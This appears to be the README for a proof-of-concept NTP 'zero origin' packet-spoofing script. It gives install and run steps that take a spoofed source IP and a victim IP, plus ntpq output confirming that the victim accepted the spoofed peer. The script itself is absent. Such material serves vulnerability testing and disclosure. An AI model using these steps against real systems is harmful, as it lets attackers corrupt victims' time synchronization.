1) Install instructions.

Install python v2.7.5 or higher.
Install Scapy v2.2.0 or higher.
Install python-ntplib.

2) Run Instructions.

python zeroorg.py
Enter the IPv4 address of the source.
Enter the IPv4 address of victim machine.
Enter the number of spoofed packets to be sent. (typically 10)
Enter sleep time between consecutive spoofed packets. (>1.5 seconds)

3) To check if the spoofed zero origin packet is processed and recorded by the victim machine, run the following commands on it.

ntpq
apeer
rv ‘assid of the spoofed source IPv4 address’

Example, spoofing 10.66.1.40:

ntpq> apeer
     remote       refid   assid  st t when poll reach   delay   offset  jitter
==============================================================================
 0.freebsd.pool. .POOL.   29028  16 p    -   64    0    0.000    0.000   0.000
 127.127.28.0    .GPS.    29030   0 l   22   64  377    0.000   -8.486   4.142
x127.127.46.0    .GPSJ.   29031   0 l   22   64  377    0.000  -127.48   4.142
*10.66.1.40      .GPS.    29032   1 u   94  128  377    0.119    0.205   0.000
+10.66.2.2       a420128  29033   2 u   12  128  377    0.245    0.379   0.048
ntpq> rv 29032
associd=29032 status=963a conf, reach, sel_sys.peer, 3 events, sys_peer,
srcadr=10.66.1.40, srcport=123, dstadr=10.66.1.53, dstport=123, leap=00,
stratum=1, precision=-18, rootdelay=0.000, rootdisp=1.083, refid=GPS,
reftime=dba5f507.096d4ff7  Mon, Oct 10 2016  4:07:51.036,
rec=dba5f50c.8e4962e1  Mon, Oct 10 2016  4:07:56.555, reach=377,
unreach=0, hmode=3, pmode=4, hpoll=7, ppoll=7, headway=180, flash=00 ok,
keyid=0, offset=0.205, delay=0.119, dispersion=7937.502, jitter=0.000,
xleave=0.051,
filtdelay=     0.12 6098808 6098808 6098808 6098808 6098808 6098808 6098808,
filtoffset=    0.20 -304940 -304940 -304940 -304940 -304940 -304940 -304940,
filtdisp=      0.00 16000.0 16000.0 16000.0 16000.0 16000.0 16000.0 16000.0
ntpq>
